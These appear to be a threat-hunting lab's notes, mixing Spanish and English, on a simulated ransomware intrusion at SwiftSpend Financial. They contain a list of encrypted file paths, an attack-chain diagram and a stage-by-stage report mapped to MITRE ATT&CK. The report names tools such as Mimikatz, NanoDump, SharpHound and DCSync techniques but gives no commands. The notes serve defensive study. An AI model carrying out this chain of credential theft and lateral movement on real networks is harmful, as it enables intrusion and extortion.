| Sep 26, 2023 @ 15:45:08.039 | `C:\Users\anna.jones\Downloads\m\x64\mimikatz.exe.777zzz`                                   |
| Sep 26, 2023 @ 15:45:08.055 | `C:\Users\anna.jones\Downloads\m\x64\mimilib.dll.777zzz`                                    |
| Sep 26, 2023 @ 15:45:08.055 | `C:\Users\anna.jones\Downloads\m\x64\mimispool.dll.777zzz`                                  |
| Sep 26, 2023 @ 15:45:08.055 | `C:\Users\anna.jones\Downloads\m\Win32\mimidrv.sys.777zzz`                                  |
| Sep 26, 2023 @ 15:45:08.133 | `C:\Users\anna.jones\Downloads\m\Win32\mimikatz.exe.777zzz`                                 |
| Sep 26, 2023 @ 15:45:08.148 | `C:\Users\anna.jones\Downloads\m\Win32\mimilib.dll.777zzz`                                  |
| Sep 26, 2023 @ 15:45:08.148 | `C:\Users\anna.jones\Downloads\m\Win32\mimilove.exe.777zzz`                                 |
| Sep 26, 2023 @ 15:45:08.148 | `C:\Users\anna.jones\Downloads\m\Win32\mimispool.dll.777zzz`                                |
| Sep 26, 2023 @ 15:45:08.148 | `C:\Users\anna.jones\Downloads\Drivers\Network_Driver.exe.777zzz`                           |
| Sep 26, 2023 @ 15:45:08.148 | `C:\Users\anna.jones\Downloads\Drivers\Printer_Driver.exe.777zzz`                           |
Se identificó actividad consistente con ransomware mediante el cifrado masivo de archivos y la modificación de sus extensiones a `.777zzz`. La actividad afectó múltiples directorios de usuario en distintos hosts comprometidos, indicando impacto sobre estaciones de trabajo adicionales tras el movimiento lateral del atacante

```bash
7z.ps1
   ↓
pwrex.ps1
   ↓
credential dumping
   ↓
robo de hashes
   ↓
movimiento lateral
   ↓
descarga de 777bomb.exe
   ↓
ejecución ransomware
   ↓
cifrado .777zzz
```

--------------

### Hypothesis

We suspect that the attacker gained access to Perry’s system via a trojanized file he downloaded from an untrusted website. Following initial execution, the attacker may have established persistence on the host to maintain access. We further hypothesize that the attacker extracted credentials from Perry’s system using known tools such as Mimikatz, which allowed lateral movement and unauthorized access to other systems in the network. If this is confirmed, it is likely that multiple and privileged user accounts have been compromised. As a final stage in the attack chain, the attacker encrypted user files on the compromised systems, causing disruption.

![Pasted image 20260514144201](../Fotos/Pasted%20image%2020260514144201.png)
# Cyber Attack Chain Report

## Executive Summary

The following report outlines a sophisticated cyber attack spanning multiple stages, successfully compromising the security of SwiftSpend Financial's network. The attack was initiated via a user executing a Trojanized installer from a typosquatting domain.

### Stage 1: Initial Access

- **Method**: A Trojanized installer was executed by the user 'perry.parsons' on host WKSTN-03. This installer launched a PowerShell script from 7zipp.org, establishing initial access.
- **Tactic & Technique**: Execution (TA0002), User Execution (T1204).

### Stage 2: Execution

- **Method**: Malicious PowerShell commands downloaded additional payloads, including credential theft tools.
- **Tactic & Technique**: Execution (TA0002), Command and Scripting Interpreter (T1059).

### Stage 3: Persistence

- **Method**: The attacker created a Windows service, 7zService, to ensure persistent access.
- **Tactic & Technique**: Persistence (TA0003), Create or Modify System Process (T1543).

### Stage 4: Defense Evasion

- **Method**: Used rundll32.exe to execute a malicious DLL, bypassing security controls.
- **Tactic & Technique**: Defense Evasion (TA0005), System Binary Proxy Execution (T1218).

### Stage 5: Credential Access

- **Method**: Executed Invoke-NanoDump.ps1 to dump LSASS memory, acquiring credentials.
- **Tactic & Technique**: Credential Access (TA0006), OS Credential Dumping (T1003).

### Stage 6: Discovery

- **Method**: Reconnaissance of Active Directory using SharpHound and PowerView scripts.
- **Tactic & Technique**: Discovery (TA0007), Account Discovery (T1087).

### Stage 7-10: Lateral Movement and Further Credential Access

- **Method**: Pass-the-Hash attack with Mimikatz and later manipulating accounts for further access.
- **Tactic & Technique**: Lateral Movement (TA0008), Use Alternate Authentication Material (T1550).

### Stage 11-12: Credential Access and Discovery

- **Method**: Extracted browser-stored credentials with Invoke-SharpChromium.
- **Tactic & Technique**: Credential Access (TA0006), Credentials from Password Stores (T1555).

### Stage 13-14: Privilege Escalation and Discovery

- **Method**: Added 'anna.jones' to a high-privileged AD group and mapped domain admin accounts.
- **Tactic & Technique**: Privilege Escalation (TA0004), Account Manipulation (T1098).

### Stage 15-17: Credential Access and Command and Control

- **Method**: DCSync attack using Invoke-SharpKatz to acquire domain credentials.
- **Tactic & Technique**: Credential Access (TA0006), OS Credential Dumping (T1003).

### Stage 18: Impact

- **Method**: Executed ransomware payload 'bomb.exe' to encrypt files.
- **Tactic & Technique**: Impact (TA0040), Data Encrypted for Impact (T1486).

## Impact and Findings

The attacker's actions led to a significant breach of sensitive credentials and the execution of ransomware, affecting critical systems. The attack utilized advanced techniques for persistence, evasion, and credential theft, highlighting the need for enhanced monitoring and incident response measures.

## Conclusion

This attack demonstrates a high level of sophistication, leveraging multiple tactics and techniques to gain and maintain access, escalate privileges, and ultimately deploy ransomware. The comprehensive use of PowerShell scripts and legitimate system processes highlights the need for enhanced monitoring and security controls to detect and mitigate such threats effectively.

![Pasted image 20260515135130](../Fotos/Pasted%20image%2020260515135130.png)

![Pasted image 20260515135254](../Fotos/Pasted%20image%2020260515135254.png)

![Pasted image 20260515135224](../Fotos/Pasted%20image%2020260515135224.png)
